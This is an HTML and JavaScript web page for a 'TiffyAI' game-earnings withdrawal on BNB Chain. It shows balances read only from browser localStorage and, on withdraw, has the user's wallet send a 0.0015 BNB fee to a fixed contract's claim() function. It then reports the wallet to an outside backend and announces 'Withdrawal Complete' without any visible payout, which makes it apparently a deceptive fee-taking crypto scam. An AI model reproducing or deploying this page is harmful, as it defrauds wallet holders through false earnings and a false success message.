<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <title>TiffyAI Transfer & Withdraw</title>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        body {
            background: url('ATM.gif') center center/cover no-repeat fixed;
            color: #0ff;
            font-family: 'Orbitron', sans-serif;
            text-align: center;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        h1 {
            text-shadow: 0 0 20px #00faff, 0 0 40px #00faff;
            margin-bottom: 30px;
            font-weight: 700;
        }

        .card {
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border: 1px solid #0ff;
            border-radius: 16px;
            display: inline-block;
            box-shadow: 0 0 25px #0ff, inset 0 0 40px rgba(0, 255, 255, 0.2);
            backdrop-filter: blur(12px);
            margin-top: 20px;
            min-width: 280px;
            max-width: 400px;
        }

        .card p, .card h2 {
            margin-top: 10px;
            margin-bottom: 10px;
        }
        
        .card div {
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .btn {
            margin-top: 20px;
            padding: 14px 30px;
            font-size: 18px;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s ease;
        }

        .withdraw-btn {
            background: rgba(147, 255, 20, 0.15);
            border: 1px solid #00ff00;
            color: #00ff00;
            box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
            animation: pulseGreen 1.5s infinite;
        }

        @keyframes pulseGreen {
            0% { box-shadow: 0 0 15px #00ff00; }
            50% { box-shadow: 0 0 40px #00ff00; }
            100% { box-shadow: 0 0 15px #00ff00; }
        }

        /* Unified Wallet & Alert Modal Styles */
        .app-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(4px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }

        .modal-inner {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ffff;
            border-radius: 20px;
            padding: 30px 20px;
            max-width: 320px;
            width: 90%;
            text-align: center;
            box-shadow: 0 0 20px #ff00ff;
        }
        
        .modal-btn {
            display: block;
            width: 100%;
            margin: 10px auto;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #111111;
            border: 1px solid #00ffff;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .modal-btn:hover {
            background: #00ffff33;
        }

        .close-modal {
            color: #ff00ff;
            font-size: 16px;
            margin-top: 12px;
            cursor: pointer;
            text-decoration: underline;
        }

        .error-message {
            color: #ff3333;
            text-shadow: 0 0 8px #ff3333;
        }

        .success-message {
            color: #00ff00;
            text-shadow: 0 0 8px #00ff00;
        }

        /* NEW: Processing bar style from the green file */
        #processing-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 10px 0;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            font-size: 1.2em;
            text-shadow: 0 0 10px #00ff00;
            display: none;
            z-index: 1000;
            box-shadow: 0 0 15px #00ff00;
        }

        /* NEW: Style for the connecting/processing text in the card */
        .processing-text {
            color: #00ff00 !important;
            text-shadow: 0 0 10px #00ff00;
        }

        /* New styles for the full-screen processing overlay */
        #processing-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85); /* Slightly darker overlay */
            backdrop-filter: blur(8px); /* More blur */
            display: none; /* Hidden by default */
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000; /* Above everything */
            color: #00faff; /* Matching original h1 color */
            font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 20px #00faff, 0 0 40px #00faff;
            position: relative; 
            overflow: hidden;
        }

        #processing-overlay img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
        }

        /* Ensure text is on top of the image */
        #processing-overlay p {
            font-size: 1.5em;
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
        }

        #processing-overlay .wallet-display {
            font-size: 1.2em;
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }
    </style>
    <link rel="manifest" href="manifest.json">
    <script>
      if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => {
          navigator.serviceWorker.register('service-worker.js').then(registration => {
            console.log('Service worker registered: ', registration);
          }).catch(error => {
            console.log('Service worker registration failed: ', error);
          });
        });
      }
    </script>
</head>
<body>

    <h1>ðŸš€ Transfer Game Earnings</h1>
    <div id="processing-bar"></div>
    <audio id="clickSound" src="click.wav" preload="auto"></audio>
    <div id="main-content"> <div class="card">
        <div><strong>Wallet:</strong> <span id="walletAddressDisplay">Not Connected</span></div>
        <div><strong>Claimed TIFFY:</strong> <span id="claimedTIFFYDisplay">0.00</span></div>
        <div><strong id="gameEarningsLabel">Browser Game Earnings:</strong> <span id="synchronizedEarningsDisplay">0.00</span></div>
        <hr style="border-color: #0ff; margin: 15px 0;">
        <h2>Total Withdrawable: <span id="totalWithdrawableDisplay">0.00</span> TIFFY</h2>
        <button id="withdrawBtn" class="btn withdraw-btn">Withdraw Funds</button>
      </div>
    </div>
    
    <div id="processing-overlay">
        <img src="withdrawal.gif" alt="Processing...">
        <p id="overlayMessage">Connecting to Wallet...</p>
        <p class="wallet-display">Wallet: <span id="overlayWalletAddress"></span></p>
        <p id="overlayAmount">Withdrawing: <span id="overlayTiffyAmount">0.00</span> TIFFY</p>
    </div>

    <div class="app-modal" id="appModal">
        <div class="modal-inner">
            <h3 id="modalTitle" style="color:#00ffff; text-shadow:0 0 10px #00ffff;"></h3>
            <p id="modalMessage" style="margin-top: 10px;"></p>
            <button class="modal-btn" id="modalBtn1" style="display:none;"></button>
            <button class="modal-btn" id="modalBtn2" style="display:none;"></button>
            <button class="modal-btn" id="modalBtn3" style="display:none;"></button>
            <div id="modalCloseBtn" class="close-modal">Close</div>
        </div>
    </div>

    <script>
        // --- Custom Modal Functions ---
        /**
         * Displays a custom modal with a title, message, and optional buttons.
         * @param {string} title The title of the modal.
         * @param {string} message The main message of the modal.
         * @param {Array<Object>} buttons An array of button objects, e.g., [{text: "OK", handler: () => { ... }}].
         * @param {string} messageClass A class for styling the message (e.g., 'error-message', 'success-message').
         */
        function showModal(title, message, buttons, messageClass = '') {
            const modal = document.getElementById('appModal');
            document.getElementById('modalTitle').textContent = title;
            const modalMessageElement = document.getElementById('modalMessage');
            modalMessageElement.textContent = message;
            modalMessageElement.className = messageClass;

            // Reset buttons
            const btns = [document.getElementById('modalBtn1'), document.getElementById('modalBtn2'), document.getElementById('modalBtn3')];
            btns.forEach(btn => {
                btn.style.display = 'none';
                btn.onclick = null;
            });
            
            // Set up new buttons if they exist
            if (buttons && buttons.length > 0) {
                buttons.forEach((btn, index) => {
                    const modalBtn = btns[index];
                    modalBtn.textContent = btn.text;
                    modalBtn.onclick = btn.handler;
                    modalBtn.style.display = 'block';
                });
            }

            document.getElementById('modalCloseBtn').onclick = () => {
                E.clickSound.play();
                modal.style.display = 'none';
            };
            modal.style.display = 'flex';
        }

        // --- Core Application Logic ---
        const E = {
            clickSound: document.getElementById('clickSound'),
            mainContent: document.getElementById('main-content'),
            withdrawBtn: document.getElementById('withdrawBtn'),
            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
            claimedTIFFYDisplay: document.getElementById('claimedTIFFYDisplay'),
            synchronizedEarningsDisplay: document.getElementById('synchronizedEarningsDisplay'),
            totalWithdrawableDisplay: document.getElementById('totalWithdrawableDisplay'),
            processingBar: document.getElementById('processing-bar'),
            gameEarningsLabel: document.getElementById('gameEarningsLabel'),
            // New elements for processing overlay
            processingOverlay: document.getElementById('processing-overlay'),
            overlayMessage: document.getElementById('overlayMessage'),
            overlayWalletAddress: document.getElementById('overlayWalletAddress'),
            overlayTiffyAmount: document.getElementById('overlayTiffyAmount')
        };
        
        let web3, account, contract, provider;
        let totalWithdrawableAmount = 0;
        const cAddr = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
        const ABI = [
            {"inputs":[],"name":"claim","outputs":[],"stateMutability":"payable", "type":"function"}
        ];
        const BACKEND = "https://tiffyai-wh-wa.onrender.com/reward";
        const DEEPLINK_BASE_URL = window.location.href.split('?')[0];

        // Ensure all clickable elements play a sound
        document.addEventListener('click', (event) => {
            if (event.target.closest('button, .modal-btn, .close-modal')) {
                E.clickSound.play();
            }
        });

        /**
         * Reads the balance from local storage and updates the UI.
         */
        function loadBalances() {
            const claimedTIFFY = parseFloat(localStorage.getItem('tiffyClaimed_browser') || localStorage.getItem('tiffyClaimed_' + account) || 0);
            const synchronizedEarnings = parseFloat(localStorage.getItem('tetrusScore') || 0);
            totalWithdrawableAmount = claimedTIFFY + synchronizedEarnings;

            E.claimedTIFFYDisplay.textContent = claimedTIFFY.toFixed(2);
            E.synchronizedEarningsDisplay.textContent = synchronizedEarnings.toFixed(2);
            E.totalWithdrawableDisplay.textContent = totalWithdrawableAmount.toFixed(2);
            E.totalWithdrawableDisplay.classList.remove('processing-text');

            if (totalWithdrawableAmount <= 0) {
                E.withdrawBtn.disabled = true;
                E.withdrawBtn.textContent = "No Funds to Withdraw";
                E.withdrawBtn.classList.add('disabled');
            } else {
                E.withdrawBtn.disabled = false;
                E.withdrawBtn.textContent = "Withdraw Funds";
                E.withdrawBtn.classList.remove('disabled');
            }
        }

        // Function to show the wallet selection modal
        function openWalletPopup() {
            if (totalWithdrawableAmount <= 0) {
                showModal("No Funds", "There are no funds to withdraw. Please play to earn more.", null);
                return;
            }

            showModal("Choose a Wallet", "Please select your preferred wallet to complete the withdrawal.", [
                { text: "MetaMask", handler: () => connectAndWithdraw('metamask', totalWithdrawableAmount) },
                { text: "Trust Wallet", handler: () => connectAndWithdraw('trust', totalWithdrawableAmount) },
                { text: "OKX Wallet", handler: () => connectAndWithdraw('okx', totalWithdrawableAmount) }
            ]);
        }

        // Logic for deep-linking
        function connectAndWithdraw(walletType, amount) {
            // First, immediately show the processing overlay and hide the main content
            document.getElementById('appModal').style.display = 'none';
            E.mainContent.style.display = 'none'; 
            E.processingOverlay.style.display = 'flex'; 
            E.overlayTiffyAmount.textContent = amount.toFixed(2);
            E.overlayMessage.textContent = 'Opening your wallet...';

            const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}`;
            
            let deepLink;
            switch(walletType) {
                case 'metamask':
                    deepLink = `https://metamask.app.link/dapp/${fullUrl}`;
                    break;
                case 'trust':
                    deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(fullUrl)}`;
                    break;
                case 'okx':
                    deepLink = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(fullUrl)}`;
                    break;
                default:
                    showModal("Error", "Invalid wallet selected.", null);
                    // In case of error, show main content again
                    E.mainContent.style.display = 'block';
                    E.processingOverlay.style.display = 'none';
                    return;
            }

            console.log("Deep link URL generated:", deepLink);

            // Navigate to the deep link
            window.location.href = deepLink;
        }

        // Function to switch to BNB Chain
        async function switchToBNB() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
                return true;
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BNB Smart Chain',
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                        return true;
                    } catch (addError) {
                        console.error("Failed to add BNB Chain:", addError);
                        return false;
                    }
                }
                console.error("Failed to switch to BNB Chain:", switchError);
                return false;
            }
        }

        // The core withdrawal function
        async function withdraw(amount) {
            E.mainContent.style.display = 'none'; // Ensure main content is hidden
            E.processingOverlay.style.display = 'flex'; // Ensure processing overlay is visible
            E.overlayMessage.textContent = 'Connecting to Wallet...';
            E.overlayTiffyAmount.textContent = amount.toFixed(2); // Display amount being withdrawn

            try {
                if (typeof window.ethereum === 'undefined') {
                    throw new Error("This feature requires a mobile wallet. Please open this page in your wallet's browser.");
                }

                provider = window.ethereum;
                web3 = new Web3(provider);

                // Update overlay with connected wallet address
                E.overlayMessage.textContent = 'Requesting wallet access...';
                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                E.overlayWalletAddress.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;

                E.overlayMessage.textContent = 'Switching to BNB Chain...';
                const isBnbChain = await switchToBNB();
                if (!isBnbChain) {
                    throw new Error("Failed to switch to BNB chain.");
                }

                E.overlayMessage.textContent = 'Wallet connected. Preparing transaction...';

                contract = new web3.eth.Contract(ABI, cAddr);
                const bnbFee = web3.utils.toWei("0.0015", "ether");
                const gasPrice = await web3.eth.getGasPrice();

                E.overlayMessage.textContent = 'Processes your withdraw, please wait to confirm the transaction.';
                
                const transaction = await contract.methods.claim().send({
                    from: account,
                    value: bnbFee,
                    gas: 50000, // Fixed, safe gas limit to bypass MetaMask's faulty estimation
                    gasPrice: gasPrice
                });
                
                if (amount > 0) {
                    await fetch(BACKEND, {
                        method: "POST",
                        headers: {"Content-Type":"application/json"},
                        body: JSON.stringify({ wallet: account, amount: amount })
                    }).catch(e => console.error("Backend log failed:", e));
                }

                localStorage.setItem('tiffyClaimed_' + account, "0");
                localStorage.setItem('tetrusScore', "0");
                
                showModal("Withdrawal Complete!", "âœ… Withdrawal Complete! Your TIFFY has been processed.", null, 'success-message');
                
            } catch (e) {
                console.error("Withdrawal error:", e);
                let errorMessage = "An unknown error occurred.";
                let errorTitle = "Withdrawal Failed";
                
                if (e.code === 4001 || (e.message && e.message.includes("user rejected"))) {
                    errorMessage = "Hey what you doing? Try again and transfer your TIFFY!";
                    errorTitle = "Transaction Canceled";
                } else if (e.code === -32603 || (e.message && (e.message.includes("insufficient funds") || e.message.includes("not enough juice")))) {
                    errorMessage = "Hey you don't have enough juice to transfer your TIFFY, get some more gas!";
                    errorTitle = "Insufficient Funds";
                } else if (e.message && e.message.includes("Failed to switch")) {
                    errorMessage = "Failed to switch to BNB Chain. Please add it to your wallet and try again.";
                    errorTitle = "Chain Switch Failed";
                } else if (e.message && e.message.includes("mobile wallet's browser")) {
                     errorMessage = "This feature requires a mobile wallet. Please open this page in your wallet's browser.";
                     errorTitle = "Connection Error";
                } else {
                    errorMessage = `âŒ Error: ${e.message || e}`;
                }

                showModal(errorTitle, errorMessage, null, 'error-message');
            } finally {
                // Keep the processing overlay visible, just update balances and log the result
                loadBalances();
            }
        }

        // Initial setup and event listeners
        window.addEventListener('load', async () => {
            const params = new URLSearchParams(window.location.search);
            const walletParam = params.get('wallet');
            const amountParam = params.get('amount');
            
            // Check for deep link parameters
            if (walletParam && amountParam) {
                // If deep link parameters exist, immediately hide the main content
                // and show the processing overlay to handle the wallet connection flow.
                E.mainContent.style.display = 'none';
                E.processingOverlay.style.display = 'flex';
                E.overlayTiffyAmount.textContent = parseFloat(amountParam).toFixed(2);
                
                // Now, call the withdraw function to proceed with the transaction.
                // The try/catch block within `withdraw` will handle any errors.
                await withdraw(parseFloat(amountParam));
            } else {
                // If no deep link parameters, show the main content as normal.
                loadBalances();
                E.mainContent.style.display = 'block';
            }
        });

        E.withdrawBtn.onclick = openWalletPopup;
    </script>
</body>
</html>
